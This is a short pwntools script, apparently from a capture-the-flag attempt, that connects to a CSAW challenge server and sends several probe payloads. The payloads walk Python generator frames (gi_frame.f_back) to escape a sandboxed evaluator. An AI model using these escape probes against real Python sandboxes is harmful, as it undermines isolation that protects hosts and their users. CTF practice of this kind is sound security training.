from pwn import *

context.log_level = 'error'

def try_payload(payload):
    r = remote('misc.chal.csaw.io', 9998)
    r.recvuntil(b'> ')
    r.sendline(payload.encode())
    try:
        data = r.recvall(timeout=5)
    except:
        data = b''
    r.close()
    return data

tests = [
    '(x for x in [1]).gi_frame.f_back',
    'next((g.gi_frame.f_back for g in [(x for x in [1])]))',
    'next((g.gi_frame.f_back.f_back for g in [(x for x in [1])]))',
    'next((g.gi_frame.f_back.f_back.f_back for g in [(x for x in [1])]))',
]
for t in tests:
    print('===', t, '===')
    print(try_payload(t))
end_of_edit

